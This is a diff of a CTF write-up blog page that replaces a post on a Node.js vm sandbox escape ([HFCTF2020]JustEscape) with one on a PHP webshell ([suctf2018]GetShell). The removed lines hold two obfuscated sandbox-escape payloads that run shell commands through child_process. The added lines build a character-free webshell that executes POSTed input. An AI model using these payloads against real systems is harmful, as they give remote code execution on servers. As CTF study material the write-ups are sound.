@@ -13,7 +13,7 @@
 
 
 
-<title>[HFCTF2020]JustEscape | Hexo</title>
+<title>[suctf2018]GetShell | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">[HFCTF2020]JustEscape</h1>
+            <h1 class="post-title">[suctf2018]GetShell</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">June 19, 2024&nbsp;&nbsp;21:35:43</a>
+                        Date: <a href="#">June 19, 2024&nbsp;&nbsp;21:42:44</a>
                         </span>
                     
                     
@@ -221,16 +221,17 @@
         </header>
 
         <div class="post-content">
-            <h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>题目说真的不是PHP吗？<br>十有八九不是，猜测可能是Java，结果是js。</p>
-<h4 id="用Error-stack-看一下报错信息。"><a href="#用Error-stack-看一下报错信息。" class="headerlink" title="用Error().stack,看一下报错信息。"></a>用<code>Error().stack</code>,看一下报错信息。</h4><p><img src="/../images/%5BHFCTF2020%5DJustEscape/1.png" alt="1"></p>
-<p>报错显示是<code>vm.js</code>，考的vm沙箱逃逸。<br>POC参考：<br>https:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com&#x2F;patriksimek&#x2F;vm2&#x2F;issues&#x2F;225<br>payload1:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+            <h2 id="suctf2018-GetShell"><a href="#suctf2018-GetShell" class="headerlink" title="[suctf2018]GetShell"></a>[suctf2018]GetShell</h2><p>参考p神利用取反来获取可用字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a = ~垂;</span><br><span class="line">echo $a.&quot;\n&quot;;</span><br><span class="line">echo $a[1];</span><br><span class="line">/*</span><br><span class="line">运行得：</span><br><span class="line">a&#125;</span><br><span class="line">a</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>payload2：（join拼接字符串）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>
+<p>🐎一下汉字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">echo ~茉**[**$____**]**;//s</span><br><span class="line"></span><br><span class="line">echo ~内**[**$____**]**;//y</span><br><span class="line"></span><br><span class="line">echo ~茉**[**$____**]**;//s</span><br><span class="line"></span><br><span class="line">echo ~苏**[**$____**]**;//t</span><br><span class="line"></span><br><span class="line">echo ~的**[**$____**]**;//e</span><br><span class="line"></span><br><span class="line">echo ~咩**[**$____**]**;//m</span><br><span class="line"></span><br><span class="line">echo ~课**[**$____**]**;//P</span><br><span class="line"></span><br><span class="line">echo ~尬**[**$____**]**;//O</span><br><span class="line"></span><br><span class="line">echo ~笔**[**$____**]**;//S</span><br><span class="line"></span><br><span class="line">echo ~端**[**$____**]**;//T</span><br><span class="line"></span><br><span class="line">echo ~瞎**[**$____**]**;//a</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/%5BHFCTF2020%5DJustEscape/2.png" alt="2"></p>
-<p>获得flag</p>
+<p>构成🐎，POST参数a：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>
+
+<p>![1](..&#x2F;images&#x2F;[SUCTF 2018]GetShell&#x2F;1.png)</p>
+<h4 id="用env访问环境变量获得flag："><a href="#用env访问环境变量获得flag：" class="headerlink" title="用env访问环境变量获得flag："></a>用env访问环境变量获得flag：</h4><p>参考自：<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1856.html">https://www.shawroot.cc/1856.html</a></p>
 
         </div>
 
@@ -245,7 +246,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/">http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/</a></span>
+                        <span><a href="http://odiws.github.io/2024/06/19/2018-GetShell/">http://odiws.github.io/2024/06/19/2018-GetShell/</a></span>
                     </p>
                 
                 
@@ -271,7 +272,7 @@
                     
                         <a href="/tags/buuctf/"># buuctf</a>
                     
-                        <a href="/tags/js-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"># js-vm沙箱逃逸</a>
+                        <a href="/tags/%E6%96%87%E4%BB%B6%E5%86%85%E6%97%A0%E5%AD%97%E7%AC%A6rce/"># 文件内无字符rce</a>
                     
                         
                 </span>
@@ -284,10 +285,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/06/19/2018-GetShell/">[suctf2018]GetShell</a>
             
-            
-            <a class="next" rel="next" href="/2024/06/18/GXYCTF2019-StrongestMind/">[GXYCTF2019]StrongestMind</a>
+            <a class="next" rel="next" href="/2024/06/19/HFCTF2020-JustEscape/">[HFCTF2020]JustEscape</a>
             
         </section>
 
